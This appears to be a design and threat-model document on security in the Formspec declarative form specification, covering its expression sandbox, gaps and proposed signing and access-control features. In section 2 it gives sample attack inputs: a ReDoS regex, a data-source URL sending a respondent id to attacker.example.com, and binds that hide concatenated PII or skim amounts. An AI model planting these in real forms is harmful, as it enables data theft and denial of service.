# Formspec and Security: A Deep Exploration

## 1. Current State -- What Security-Relevant Features Already Exist

Formspec is not a security specification, but its design embeds several properties that are security-relevant -- some by deliberate architectural choice, others as incidental consequences of being declarative rather than imperative.

### 1.1 FEL Sandboxing (Strongest Existing Property)

The single most important security decision in formspec's history is documented in ADR 0011 (`thoughts/archive/adr/0011-hardening-plan.md`): the elimination of `eval()` and `new Function()` from the FEL evaluator. The original prototype used JavaScript's native eval to execute expressions. The hardened implementation replaced this with a formal lexer/parser/interpreter pipeline (Chevrotain in TypeScript, hand-rolled recursive descent in Rust, standalone parser in Python).

FEL is designed as a **closed sandbox** by specification:
- No statements, loops, or variable assignment
- No I/O, no file system access, no network access
- No user-defined functions
- No host-language interop (expressions cannot call into JavaScript/Python/Rust)
- Deterministic (except `now()`)
- Side-effect free -- expressions cannot modify the instance
- All function calls resolve to a fixed stdlib catalog

The Rust evaluator (`crates/fel-core/src/evaluator.rs`) applies a `RegexBuilder::new(&pattern).size_limit(1_000_000)` limit on the `matches()` function's compiled regex, which is a specific ReDoS mitigation. This is not documented in the spec as a normative requirement, but the implementation provides it.

The engine also validates for **circular dependencies** at definition load time (`validateCalculateBindCycles`, `validateVariableDefinitionCycles` in `packages/formspec-engine/src/engine/definition-setup.ts`), preventing infinite recalculation loops.

### 1.2 HTML Sanitization in Rendering

The webcomponent's markdown renderer (`packages/formspec-webcomponent/src/components/display.ts`) escapes HTML entities before any markdown processing:

```typescript
let html = src
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
```

This prevents XSS through definition-authored markdown content. The comment explicitly states "Escape HTML entities first to prevent injection" and the function's docstring says "Output is pre-sanitized (no raw HTML passthrough)."

However, the output is then assigned via `innerHTML` -- the sanitization is effective only because the escape-first approach removes the possibility of injecting tags. There are also `innerHTML` uses for static SVG icons (wizard navigation arrows, modal close buttons) which are safe because they use hardcoded string literals, not user-controlled data.

### 1.3 Extension Validation

The extension model enforces several security-relevant constraints:
- Extensions MUST NOT alter core semantics (required, relevant, readonly, calculate, FEL evaluation, valid flag)
- All extension identifiers MUST be `x-` prefixed
- Unresolved extensions produce `UNRESOLVED_EXTENSION` errors, not silent passthrough
- Extension functions must be pure, total, and declare their signatures
- The registry enforces `(name, version)` uniqueness and lifecycle state tracking (draft/stable/deprecated/retired)

### 1.4 Type System Strictness

FEL's type system is a defense layer: no implicit coercion, no truthy/falsy semantics, cross-type comparisons are type errors. This prevents a class of logic bugs that could be security-relevant -- e.g., `"" = false` does not silently evaluate to `true`.

### 1.5 Immutable Versioning

The `(url, version)` identity tuple is specified as globally unique and immutable. Active versions MUST NOT be modified in place. Responses are pinned to specific versions. This creates an integrity property -- a response always knows which definition it was collected against, and that definition cannot be silently changed after the fact.

### 1.6 What Is Notably Absent

- No definition signing, no integrity hashes
- No field-level access control or visibility permissions
- No encryption primitives
- No data classification beyond the advisory `semanticType` metadata annotation
- No rate limiting or resource bounds in the spec (the Rust regex limit is implementation-level)
- No formal threat model
- No CSP guidance for browser deployments
- No guidance on secure data source loading
- The `formspec-fn:` host function URI scheme has no trust model

---

## 2. Threat Model -- Security Surface Area

### 2.1 FEL Expression Injection

**Attack surface**: Anywhere a FEL expression string is authored or modified.

**Current mitigations**: FEL is a closed sandbox with no I/O, no host interop, and no side effects. Even a "malicious" expression can only compute a value -- it cannot exfiltrate data, access the network, or modify system state. The expression `substring($ssn, 1, 4) & "-redacted"` can reveal parts of field values, but only to the instance's own user/renderer.

**Residual risks**:

**(a) ReDoS via `matches()`**: A form definition can include `constraint: "matches($, '^(a+)+$')"` -- a classic catastrophic backtracking pattern. The Rust evaluator mitigates this with `size_limit(1_000_000)`, but the spec does not mandate this. A conformant Python or Java implementation could be vulnerable. The FEL grammar spec (`specs/fel/fel-grammar.md`) and core spec do not prescribe regex engine constraints.

**(b) Compute amplification**: FEL allows element-wise array operations. An expression like `sum($largeRepeat[*].a * $largeRepeat[*].b * $largeRepeat[*].c)` over a group with thousands of instances could create non-trivial CPU load. The spec says "min 100 iteration limit" for calculate convergence but does not cap array sizes or expression complexity.

**(c) Dependency graph explosion**: Deeply nested repeatable groups with many cross-references could create pathologically large dependency DAGs. The spec mandates cycle detection but does not mandate size limits.

**What FEL's sandbox CANNOT do**: Read cookies, access localStorage, make network requests, import modules, access the DOM, modify other forms' data, execute arbitrary code. This is the strongest security property of the declarative approach.

### 2.2 Definition Tampering

**Attack surface**: The form definition JSON document in transit or at rest.

**Scenario**: A form definition for a financial audit is intercepted and modified. The attacker changes a `constraint` expression to always return `true`, effectively disabling validation. Or changes a `calculate` bind to skim amounts: `calculate: "$amount * 0.99"` (diverting 1% to a different total). Or changes a `relevant` bind to hide a required disclosure field.

**Current mitigations**: None in the specification. The `(url, version)` immutability rule says active definitions MUST NOT be modified, but this is a governance constraint, not a cryptographic one. There is no mechanism to verify that a definition received by a client is the same one that was published.

**The declarative advantage**: Because definitions are plain JSON with no code, they are amenable to content-addressable hashing (SHA-256 of canonical JSON), signature schemes (JWS/JWK), and diff-based audit. An imperative form builder's "definition" includes executable code that resists these techniques.

### 2.3 Data Exfiltration via Form Design

**Attack surface**: A malicious form designer (insider threat or compromised design tool) could craft a form that extracts data through subtle means.

**Scenarios**:

**(a) Calculated field leakage**: A `calculate` bind could concatenate sensitive fields into a seemingly innocuous computed display field: `calculate: "$ssn & $dob & $name"` on a field labeled "Internal Reference Number." The user sees an opaque string; the form designer has structured the response data to contain concatenated PII in a single field.

**(b) Data source exfiltration**: A `source` URL on a data source declaration could point to an attacker-controlled endpoint: `"source": "https://attacker.example.com/log?respondentId={{id}}"`. The engine's `fetch()` call (`packages/formspec-engine/src/engine/FormEngine.ts:685`) would send the request to the attacker's server. The URL itself could encode information. There is no URL allowlisting in the spec or implementation.

**(c) Mapping rule exfiltration**: A mapping document could route response data to an unexpected target schema or endpoint. The mapping spec allows arbitrary FEL expressions in transform rules, and the `targetSchema` controls where data flows.

**(d) Screener routing leakage**: A screener route's `target` URL is a canonical form reference, but the route's `condition` evaluates FEL expressions against screener inputs. A malicious screener could route users to different forms based on sensitive classification answers, and the `target` URLs could encode the classification result.

**Current mitigations**: None. The spec explicitly says `semanticType` is "purely metadata" and does not affect behavior. There is no data classification system, no data flow analysis, no restrictions on where `source` URLs can point.

### 2.4 Extension Security -- Registry as Attack Vector

**Attack surface**: Extension registry documents loaded by the engine.

**Scenarios**:

**(a) Malicious extension function**: An extension function registered with `category: "function"` could, if the host implementation is careless, execute arbitrary code. The spec says extension functions must be "pure" and "total," but enforcement is on the implementor. A registry entry merely describes the signature; the actual implementation is provided by the host environment.

**(b) Registry poisoning**: If a processor loads registry documents from a URL (the spec mentions "well-known registry endpoints"), a DNS hijack or MITM could substitute a malicious registry that changes extension semantics.

**(c) Namespace squatting**: The `x-{org}-{domain}` naming convention prevents collisions by convention, not by cryptographic proof. An attacker could publish a registry with `x-acme-validation` entries that shadow a legitimate organization's extensions.

**Current mitigations**: The `x-formspec-` prefix is reserved for core promotion. `UNRESOLVED_EXTENSION` is enforced. But there is no signature verification on registry documents, no publisher identity verification beyond the `publisher` metadata field, and no mechanism to distinguish "this registry was published by the entity it claims" from "this registry was published by anyone."

### 2.5 Cross-Form Data Leakage in Multi-Tenant Environments

**Attack surface**: Shared runtime environments where multiple forms run in the same process.

**Scenarios**:

**(a) Static instance cache poisoning**: The `FormEngine` class has a static `instanceSourceCache` (`packages/formspec-engine/src/engine/FormEngine.ts:680`). All engine instances in the same process share this cache. If two tenants use the same `source` URL for their data sources, one tenant's data could be served to another tenant.

**(b) FEL `@instance()` cross-reference**: Secondary instances are namespaced by the `name` property, but there is no tenant isolation at the instance level. If two form engines in the same process share runtime state, `@instance('patients')` in one form could theoretically resolve data from another form's data source.

**(c) `formspec-fn:` callback isolation**: The host function mechanism (`formspec-fn:lookupPatient`) relies on the host to provide the callback. If the host provides the same callback to forms for different tenants without scoping, tenant data could leak.

**Current mitigations**: None at the spec level. The static cache is an implementation concern. The spec does not address multi-tenancy.

### 2.6 Client-Side vs. Server-Side Validation Gap

**Attack surface**: The gap between what the client validates and what the server trusts.

**Scenario**: A form has a shape rule `constraint: "$amount <= 10000"` that limits transaction amounts. The client-side engine enforces this. But if the server accepts the response JSON without re-evaluating the definition's shapes and binds against the submitted data, an attacker who submits directly to the API bypasses the constraint.

**Current mitigations**: The spec supports this dual-validation architecture by design -- FEL is language-agnostic, with reference implementations in TypeScript, Rust, and Python. The response schema includes `definitionUrl` and `definitionVersion`, giving the server everything it needs to re-validate. But the spec does not REQUIRE server-side validation. It says "saving data must NEVER be blocked by validation" and "only submission requires `valid = true`" -- but this is about client UX, not server-side enforcement.

The Python conformance suite and the Rust WASM evaluator provide server-side evaluation paths, but the spec's conformance requirements do not mandate server-side re-validation.

### 2.7 Component Injection via Custom Components

**Attack surface**: The component registry in `formspec-webcomponent`.

**Scenario**: A custom component registered via `ComponentRegistry` could inject arbitrary DOM elements, event listeners, or scripts. The component receives a `RenderContext` with access to the engine's signals, the DOM container, and rendering utilities.

**Current mitigations**: The component spec says "no imperative event scripting" and "no dynamic component type switching at runtime," but these are spec-level constraints, not enforced by the registry at runtime. The `ComponentRegistry` is a simple map from type string to render function -- there is no sandboxing of what a registered component can do.

The component spec also states that custom components use "parameter interpolation in allowed string fields, prohibit recursive cycles, and must fail fast on missing required params." But this applies to declaratively defined custom components in the component document, not to programmatically registered components in the JavaScript registry.

### 2.8 Supply Chain Attacks via Registry

**Attack surface**: The extension registry document loading mechanism.

**Scenario**: A formspec deployment loads its common registry from `https://registry.formspec.org/common.json`. An attacker who compromises this URL (or performs a dependency confusion attack with a similarly named local registry) could inject malicious extension definitions that alter validation semantics, disable constraints, or add functions that behave unexpectedly.

**Current mitigations**: The spec says "Registry documents describe extension metadata and compatibility, but do not prescribe centralized hosting or governance." There is no integrity verification, no signing, no certificate pinning.

---

## 3. Creative Possibilities -- What Could Formspec Become

### 3.1 Definition Signing and Integrity Verification

**Concept**: Cryptographic signatures on form definitions, analogous to code signing for applications or JWT signing for API tokens.

**How it would work**:

```json
{
  "$formspec": "1.0",
  "url": "https://grants.gov/forms/sf-425",
  "version": "2.1.0",
  "integrity": {
    "algorithm": "sha-256",
    "digest": "a1b2c3d4e5f6...",
    "signature": "eyJhbGciOiJSUzI1NiJ9...",
    "publicKey": "https://grants.gov/.well-known/formspec-keys.jwk"
  },
  "items": [...]
}
```

The `digest` covers the canonical JSON of the definition (excluding the `integrity` object itself). The `signature` is a JWS compact serialization. Processors that support integrity verification would:

1. Compute the digest of the definition (minus the `integrity` block)
2. Verify the digest matches
3. Verify the signature against the public key
4. Optionally verify the public key against a trust store

**Why this is uniquely suited to formspec**: Because definitions are plain JSON data, canonicalization is straightforward (JCS, RFC 8785). Imperative form builders cannot easily sign their "definitions" because they include executable code whose behavior depends on the runtime environment. A signed formspec definition has a verifiable guarantee: "this is exactly the form that was published."

**Spec integration**: Extension to the top-level definition schema. A new `integrity` property with `algorithm`, `digest`, `signature`, and optional `publicKey` or `keyId`. The conformance level could be "Extended" -- core processors may ignore it, extended processors MUST verify when present.

### 3.2 Field-Level Data Classification

**Concept**: Elevate `semanticType` from advisory metadata to a classification system with behavioral implications.

**Current state**: `semanticType` is "purely metadata -- MUST NOT affect validation or behavior." This is deliberately restrictive to keep Tier 1 clean. But a Tier 2 or extension-level classification system could build on it.

**Proposed extension**: A new `x-formspec-classification` extension property on fields:

```json
{
  "key": "ssn",
  "type": "field",
  "dataType": "string",
  "extensions": {
    "x-formspec-classification": {
      "level": "pii",
      "categories": ["identifier", "government-id"],
      "retention": "90d",
      "exportRestriction": "redact"
    }
  }
}
```

**Behavioral implications (in an extended processor)**:
- `level: "pii"` triggers audit logging of value access
- `exportRestriction: "redact"` causes mapping rules to redact the value unless explicitly authorized
- `retention: "90d"` annotates response storage systems
- `categories` enable data flow analysis tooling

**Why a declarative system is better here**: In an imperative form builder, data classification is typically a runtime annotation applied by application code -- it lives outside the form definition, so it cannot be audited, versioned, or enforced consistently. In formspec, classification is part of the definition document -- it travels with the form, is subject to the same versioning and integrity rules, and can be statically analyzed.

### 3.3 Zero-Knowledge Form Validation

**Concept**: A form where the server validates responses without seeing plaintext values.

**Why this is not as crazy as it sounds**: FEL's constraint expressions are structured, deterministic, and can be compiled into circuits. Consider a constraint like `$ >= 18` on an `age` field. A zero-knowledge proof system could verify that the submitted age satisfies this constraint without revealing the actual age.

**How it could work**:

1. The form definition declares constraints as FEL expressions (already exists)
2. A ZK-aware processor compiles each FEL constraint expression into an arithmetic circuit
3. The client evaluates the expression, generates a proof, and submits the proof alongside the (encrypted) response
4. The server verifies the proofs against the compiled circuits without decrypting the response

**Practical constraints**: This is feasible for simple constraints (comparisons, arithmetic, equality) but becomes impractical for string operations, dates, and aggregate functions. The FEL function `matches()` with regex cannot be efficiently expressed as an arithmetic circuit.

**Realistic near-term version**: Rather than full ZK proofs, formspec could support **commitment schemes** -- the client submits a hash commitment of sensitive field values, and the server verifies constraints against sealed values using a trusted execution environment (TEE).

**Spec integration**: A new `privacy` property on binds or shapes specifying proof requirements:

```json
{
  "path": "income",
  "constraint": "$ > 0 and $ <= 500000",
  "privacy": {
    "proofType": "range-proof",
    "reveal": false
  }
}
```

### 3.4 Capability-Based Field Access Control

**Concept**: Fine-grained permissions on form sections and fields, modeled as capabilities rather than roles.

**Design**: Instead of "admin can see all fields" (role-based), capabilities are attached to the form definition and granted to specific actors:

```json
{
  "capabilities": {
    "view:medical": {
      "description": "View medical history fields",
      "fields": ["medicalHistory.*", "diagnosis", "medications"]
    },
    "edit:billing": {
      "description": "Edit billing information",
      "fields": ["insurance.*", "billingAddress"]
    },
    "view:redacted": {
      "description": "View SSN/DOB in redacted form",
      "fields": ["ssn", "dob"],
      "redaction": "partial"
    }
  }
}
```

**How this interacts with existing primitives**: Capabilities map naturally to FEL and binds:

- `relevant` already controls visibility -- a capability-unaware field is simply non-relevant
- `readonly` already controls editability -- a view-only capability makes fields readonly
- `nonRelevantBehavior` controls data handling for hidden fields

The engine could synthesize bind expressions from capability grants:

```
relevant: "hasCapability('view:medical')"
readonly: "not hasCapability('edit:billing')"
```

This is more powerful than static role-based visibility because capabilities are composable, delegatable, and inspectable. A "patient" capability set differs from a "doctor" capability set, and a "billing clerk" set overlaps with "doctor" on insurance fields but not medical history.

**Why declarative beats imperative here**: In imperative form builders, access control is typically implemented in application code around the form -- `if (user.role === 'doctor') showSection('medical')`. This logic is not part of the form definition, cannot be audited by looking at the form, and cannot be verified by a third party. In formspec, the capability declarations are IN the definition document, versioned and signed alongside the form structure.

### 3.5 Static Data Flow Analysis

**Concept**: Tooling that traces where sensitive data flows through FEL expressions, calculate binds, mapping rules, and data sources.

**Implementation**: Because FEL is not Turing-complete, data flow analysis is decidable. The dependency visitor (`packages/formspec-engine/src/engine/definition-setup.ts`) already extracts field references from FEL expressions. Extending this to a taint analysis is straightforward:

1. Mark fields with classification (e.g., `ssn` is PII)
2. Trace all FEL expressions that reference `$ssn`
3. Identify all targets that receive values computed from `$ssn`
4. Flag any mapping rules that export tainted fields to external schemas
5. Flag any `source` URLs that could encode tainted values
6. Flag any calculated fields that concatenate tainted values with non-tainted ones

**Example output**:

```
DATA FLOW ANALYSIS: ssn (pii/government-id)
  -> calculate bind on internalRef: "$ssn & '-' & $dob"
     WARNING: PII concatenated into non-classified field 'internalRef'
  -> mapping rule #3: preserve to /applicant/taxId
     OK: target field has matching classification
  -> shape constraint: matches($ssn, '^\d{3}-\d{2}-\d{4}$')
     OK: validation only, no data flow
```

**Why this is unique to declarative forms**: Imperative forms execute arbitrary code, making data flow analysis equivalent to the halting problem. FEL's restricted grammar makes it tractable.

### 3.6 Sandboxed FEL -- Formal Resource Bounds

**Concept**: A normative security model for FEL evaluation with guaranteed resource bounds.

**What the spec should specify**:

1. **Regex complexity limit**: MUST limit compiled regex size (the Rust implementation already does this at 1MB, but the spec should mandate it)
2. **Expression depth limit**: MUST reject expressions deeper than N nested calls (prevents stack overflow)
3. **Array size limit**: MUST limit element-wise operations to N elements (prevents compute amplification)
4. **Recalculation iteration limit**: Already specified as "min 100" -- should also specify a maximum
5. **String length limit**: MUST limit string concatenation results to N characters
6. **Evaluation timeout**: SHOULD support a per-expression evaluation timeout

**Spec integration**: A new section "3.7 FEL Resource Bounds" in the core spec, with normative requirements on conformant processors. This would make formspec's sandbox model formally specified rather than implementation-dependent.

### 3.7 Redaction Policies

**Concept**: Declarative rules for what to redact in different contexts (display, export, audit log, API response).

```json
{
  "redaction": {
    "policies": {
      "display": {
        "ssn": { "strategy": "mask", "pattern": "***-**-{last4}" },
        "dob": { "strategy": "age", "format": "{years} years old" },
        "income": { "strategy": "range", "buckets": [25000, 50000, 75000, 100000] }
      },
      "export": {
        "ssn": { "strategy": "hash", "algorithm": "sha-256", "salt": "per-response" },
        "dob": { "strategy": "generalize", "precision": "year" }
      },
      "audit": {
        "*": { "strategy": "preserve" }
      }
    }
  }
}
```

**Interaction with mapping spec**: Redaction policies could be automatically applied during mapping transforms. A mapping rule that exports `ssn` to an external schema would consult the redaction policy for the export context and apply the appropriate strategy.

**Interaction with theme spec**: The display redaction policy could be applied at the presentation layer -- a `TextInput` component displaying an SSN could automatically apply the mask pattern.

### 3.8 Temporal Access Control

**Concept**: Fields that change behavior based on temporal conditions.

This already half-exists -- FEL has `today()` and `now()`, and `relevant`/`readonly` binds can use them:

```json
{
  "path": "amendmentSection",
  "relevant": "dateDiff($submissionDate, today(), 'days') <= 30",
  "readonly": "dateDiff($submissionDate, today(), 'days') > 14"
}
```

**Extension**: A richer temporal access control model could support:

- **Embargo periods**: Fields that are hidden until a date, then revealed (e.g., a grant reviewer's score is hidden until all reviews are submitted)
- **Expiration**: Responses that become readonly after a deadline
- **Audit windows**: Fields that are editable during an audit period, then sealed

These are expressible in FEL today. The creative opportunity is to formalize them as a pattern library or extension vocabulary that tooling can recognize and enforce.

### 3.9 Multi-Party Forms

**Concept**: Form sections that are visible/editable only by specific parties, with cryptographic enforcement.

**Scenario**: A healthcare form where:
- The patient fills out demographics and symptoms (editable by patient, visible to all)
- The doctor fills out diagnosis and treatment plan (editable by doctor, visible to doctor and billing)
- Billing fills out insurance coding (editable by billing, invisible to patient)

**How formspec could model this**:

```json
{
  "parties": {
    "patient": { "publicKey": "..." },
    "provider": { "publicKey": "..." },
    "billing": { "publicKey": "..." }
  },
  "items": [
    {
      "key": "diagnosis",
      "type": "field",
      "extensions": {
        "x-formspec-party": {
          "editableBy": ["provider"],
          "visibleTo": ["provider", "billing"],
          "encryptFor": ["provider", "billing"]
        }
      }
    }
  ]
}
```

**Encryption model**: Each party's fields are encrypted with a symmetric key, and that key is encrypted with each authorized party's public key (envelope encryption). The response document contains ciphertext; only authorized parties can decrypt their sections.

**Interaction with validation**: Shape rules that span multiple parties' fields (e.g., "diagnosis must be filled if symptoms indicate emergency") would need to evaluate against encrypted data. This could use commitment schemes or TEEs, or the shape could be evaluated at a trust boundary where all parties' data is decrypted.

### 3.10 Secure Defaults -- Security-by-Default Patterns

**Concept**: Specification-level defaults that make the secure choice the easy choice.

**Proposed secure defaults**:

1. **Data source URL restrictions**: The spec could recommend (SHOULD) that processors restrict `source` URLs to same-origin or a configured allowlist. The current implementation does an unrestricted `fetch()`.

2. **Default `nonRelevantBehavior` is already "remove"**: This is a good default -- non-relevant field values are removed from the response, reducing data surface.

3. **External validation context restriction**: The spec already says context metadata "MUST NOT include sensitive credentials or internal system details." This could be strengthened to "MUST NOT include values of fields classified as PII."

4. **String length validation**: The definition schema does not enforce `maxLength` on string fields. Adding a default maximum (e.g., 10,000 characters) would prevent payload inflation attacks.

5. **Attachment size limits**: The `attachment` dataType has no declared size limits. The schema could enforce a `maxSize` property.

6. **Registry integrity**: The spec could require that registry documents loaded from URLs be verified against a manifest hash.

---

## 4. Spec Integration Points

### Tier 1 (Core) -- Data Model Security

- **Definition integrity**: `integrity` property on the definition top-level object (digest, signature, public key reference)
- **Field classification**: Promotion of `semanticType` to a classification-aware property, or a new `x-formspec-classification` extension vocabulary
- **FEL resource bounds**: Normative section specifying regex limits, expression depth, array size, evaluation timeout
- **Data source restrictions**: Normative guidance on URL validation for `source` properties
- **Response encryption**: `encryptedFields` property on the response schema, indicating which field paths are encrypted and with what key identifiers

### Tier 2 (Theme) -- Visibility and Redaction

- **Redaction policies**: Theme-level or definition-level declarations of how fields are displayed in different contexts
- **Capability-aware rendering**: Theme selectors that activate based on granted capabilities
- **Audit trail rendering**: A theme mode that renders all fields (including non-relevant) with their full history, for auditing purposes

### Tier 3 (Component) -- Secure Input Components

- **Masked input components**: A `MaskedInput` component type that enforces partial display (showing only last 4 digits, etc.)
- **Secure file upload**: A `SecureFileUpload` component that encrypts attachments client-side before upload
- **Signature with key binding**: The existing `Signature` component could be extended to produce cryptographically verifiable signatures tied to the response content

### Mapping Tier -- Secure Data Transformation

- **Redaction-aware transforms**: Mapping rules that automatically apply redaction policies based on the target context
- **Data flow annotations**: Mapping rules annotated with data classification, enabling static analysis of whether PII flows to unauthorized targets
- **Encrypted field handling**: Mapping transforms that operate on encrypted fields, either by decrypting at a trust boundary or by applying homomorphic operations

### Registry Tier -- Trust and Verification

- **Registry signing**: JWS signatures on registry documents, with publisher key verification
- **Extension sandboxing**: Specification of what extension functions may and may not do (I/O restrictions, computation limits)
- **Trust anchors**: A mechanism for declaring trusted registry publishers, analogous to certificate authority trust stores
- **Provenance chains**: Registry entries with `derivedFrom` linking, enabling audit of how an extension evolved

---

## 5. Real-World Scenarios

### 5.1 Healthcare -- Multi-Party Clinical Form

A patient intake form where:
- **Patient** fills out demographics (SSN, DOB, address) and symptoms
- **Physician** fills out clinical assessment, diagnosis codes, treatment plan
- **Billing clerk** fills out insurance information and CPT/ICD codes
- **Auditor** can view all fields in read-only mode

**Formspec modeling**:

```json
{
  "capabilities": {
    "patient:edit": {
      "fields": ["demographics.*", "symptoms.*", "consent"]
    },
    "physician:edit": {
      "fields": ["assessment.*", "diagnosis.*", "treatmentPlan.*"]
    },
    "billing:edit": {
      "fields": ["insurance.*", "cptCodes.*", "icdCodes.*"]
    },
    "audit:view": {
      "fields": ["*"],
      "readonly": true
    }
  },
  "redaction": {
    "policies": {
      "billing-view": {
        "demographics.ssn": { "strategy": "mask", "pattern": "***-**-{last4}" }
      }
    }
  }
}
```

The physician sees the patient's demographics and symptoms (readonly) plus their own editable assessment. The billing clerk sees demographic identifiers (redacted SSN) plus insurance fields. The patient never sees diagnosis codes or billing information. The auditor sees everything.

**What makes this declarative approach superior**: The access control policy is part of the form definition. It can be version-controlled, diff-reviewed, signed, and audited. A compliance officer can read the JSON and verify that billing clerks cannot see full SSNs without reading any application code.

### 5.2 Financial Form -- Audit-Grade Integrity

A federal financial report (e.g., SF-425) where:
- The form definition is published by a government agency with a cryptographic signature
- Every response is pinned to the signed definition version
- All calculated fields (totals, percentages, variances) are re-validated server-side using the same FEL expressions
- The response includes an integrity hash covering all submitted values
- Mapping transforms to the agency's XML schema are verified against the signed mapping document

**Integrity chain**:

```
Agency Key --signs--> Definition v2.1.0
Definition v2.1.0 --contains--> FEL expressions for all calculations
Response --pins-to--> Definition v2.1.0 (url + version)
Response --contains--> integrity.digest of all data values
Server --re-evaluates--> FEL expressions against submitted data
Server --verifies--> Response digest matches submitted values
Server --applies--> Signed mapping document to produce XML
```

This creates a chain of trust from the agency's publishing key to the final XML submission. Every transformation is declarative and verifiable.

### 5.3 Government Form -- Data Classification

A security clearance form (e.g., SF-86) where:
- Fields are classified at different sensitivity levels (UNCLASSIFIED, CUI, SECRET)
- Classification markers are part of the form definition
- Display context determines redaction level
- Export to different systems applies appropriate redaction
- Static data flow analysis proves that SECRET fields never flow to UNCLASSIFIED exports

```json
{
  "key": "foreignContacts",
  "type": "group",
  "repeatable": true,
  "extensions": {
    "x-formspec-classification": {
      "level": "cui",
      "markings": ["CUI//SP-PRVCY"],
      "dissemination": ["dod", "ic"]
    }
  },
  "children": [
    {
      "key": "contactName",
      "type": "field",
      "dataType": "string",
      "extensions": {
        "x-formspec-classification": {
          "level": "cui",
          "categories": ["pii", "foreign-contact"]
        }
      }
    }
  ]
}
```

**Static analysis output**:

```
CLASSIFICATION ANALYSIS: foreignContacts.contactName (CUI//SP-PRVCY)
  Data flows:
    -> calculate bind on summaryReport: format('{0}: {1}', $contactName, $relationship)
       VIOLATION: CUI data flows to field 'summaryReport' classified as UNCLASSIFIED
    -> mapping rule to /contacts/[]/name in unclassified-export.mapping.json
       VIOLATION: CUI data mapped to unclassified export target
    -> mapping rule to /classified/contacts/[]/name in classified-export.mapping.json
       OK: target has matching classification
```

### 5.4 Multi-Organization Shared Form

A collaborative grant application where multiple organizations each fill out their section:
- Organization A fills out their budget and personnel
- Organization B fills out their budget and personnel
- The lead PI fills out the project narrative and sees a consolidated budget view
- Each organization can only see and edit their own section's data

**Formspec modeling using repeatable groups and capabilities**:

```json
{
  "key": "organizations",
  "type": "group",
  "repeatable": true,
  "children": [
    {
      "key": "orgName", "type": "field", "dataType": "string"
    },
    {
      "key": "budget",
      "type": "group",
      "extensions": {
        "x-formspec-party": {
          "editableBy": ["org:{orgId}"],
          "visibleTo": ["org:{orgId}", "lead-pi"]
        }
      },
      "children": [...]
    }
  ]
}
```

The consolidated budget view uses FEL aggregate functions that the lead PI can see:

```json
{
  "path": "totalBudget",
  "calculate": "sum($organizations[*].budget.directCosts)"
}
```

Each organization's data is encrypted with their organization's key. The lead PI holds a derived key that can decrypt the budget totals but not individual line items.

---

## 6. What Makes Formspec Uniquely Defensible in Security

The overarching insight is this: **declarative systems are auditable in ways that imperative systems are not.**

1. **Static analysis is tractable**. FEL is not Turing-complete. Data flow analysis, taint tracking, complexity bounds, and termination guarantees are all decidable. You cannot do this with forms built in JavaScript or Python.

2. **Definitions are signable**. A form definition is a JSON document, not executable code. It can be content-addressed, signed, and verified. You cannot meaningfully sign an Angular component.

3. **Behavior is inspectable**. Every calculation, validation rule, visibility condition, and data transformation is expressed in FEL and stored in the definition. An auditor can read the form's complete behavioral model without executing it. In an imperative form builder, behavior is scattered across event handlers, middleware, and framework lifecycle hooks.

4. **Separation of data and presentation is enforceable**. Because formspec's three tiers separate structure/behavior/presentation by specification, access control policies can be applied at the data layer and enforced independently of the rendering layer. A form that hides a field via CSS in an imperative builder can have that field revealed by a browser devtools user. A form that hides a field via `relevant: false` in formspec removes the field's value from the response entirely (under `nonRelevantBehavior: "remove"`).

5. **Cross-implementation consistency is guaranteed**. Because FEL is deterministic and language-agnostic, the same validation rules execute identically on client and server. This eliminates the class of security bugs where client-side validation is bypassed by submitting directly to the server API.

6. **The extension model is bounded**. Extensions must be declared, registered, and resolved. They cannot alter core semantics. A malicious extension cannot change what `required` or `relevant` means. This is a formal containment guarantee that imperative plugin systems cannot provide.

The security features that do not yet exist -- signing, classification, access control, data flow analysis -- are **dramatically easier to build for a declarative system** than for an imperative one. Formspec's architecture does not just tolerate security features; it actively enables them in ways that other form systems structurally cannot.
